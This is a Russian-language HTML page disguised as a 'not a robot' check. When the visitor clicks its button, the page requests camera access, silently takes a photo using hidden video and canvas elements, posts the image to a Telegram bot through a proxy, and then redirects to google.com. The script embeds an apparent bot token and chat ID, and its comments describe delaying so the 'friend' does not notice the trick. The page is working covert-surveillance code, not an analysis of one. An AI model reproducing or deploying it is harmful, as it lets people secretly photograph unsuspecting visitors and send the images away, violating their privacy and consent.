<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка контента...</title>
    <style>
        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .container { text-align: center; padding: 20px; background: white; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 10px; width: 100%; transition: 0.3s; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        #status { margin-top: 15px; font-size: 14px; color: #555; }
        video, canvas { display: none; } /* Скрываем технические элементы */
    </style>
</head>
<body>

<div class="container">
    <h2>Подтвердите, что вы не робот</h2>
    <p>Для доступа к контенту нажмите кнопку ниже</p>
    <button id="actionBtn">Я не робот (Продолжить)</button>
    <div id="status"></div>
</div>

<!-- Технические элементы -->
<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    // ТВОИ ДАННЫЕ (ПРОВЕРЬ ИХ!)
    const token = '8606836997:AAEi_rRmslGqHJQ0pk6KPFjDMROHtG6s0EQ';
    const chatId = '1976857829';
    const targetUrl = 'https://google.com'; // Куда перекинет в конце

    // Используем прокси для обхода блокировок в РФ
    const proxyUrl = `https://api.tgproxy.id{token}/sendPhoto`;

    const btn = document.getElementById('actionBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const status = document.getElementById('status');

    btn.addEventListener('click', async () => {
        btn.disabled = true;
        status.innerText = "Проверка доступа к камере...";

        try {
            // 1. Запрашиваем камеру
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            status.innerText = "Загрузка данных (3 сек)...";
            
            // Ждем 2 секунды, чтобы камера сфокусировалась и друг не заметил подвоха
            await new Promise(res => setTimeout(res, 2000));

            // 2. Делаем фото
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));

            // 3. Отправляем через прокси в Telegram
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'user_photo.jpg');

            const response = await fetch(proxyUrl, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log("Успех: фото отправлено");
            } else {
                const errData = await response.json();
                console.error("Ошибка API:", errData.description);
            }

            // Выключаем камеру
            stream.getTracks().forEach(track => track.stop());

        } catch (err) {
            console.log("Доступ отклонен или ошибка:", err.name);
            status.innerText = "Ошибка доступа. Попробуйте еще раз.";
        } finally {
            // 4. Переход по ссылке в любом случае через секунду
            status.innerText = "Перенаправление...";
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 1000);
        }
    });
</script>

</body>
</html>
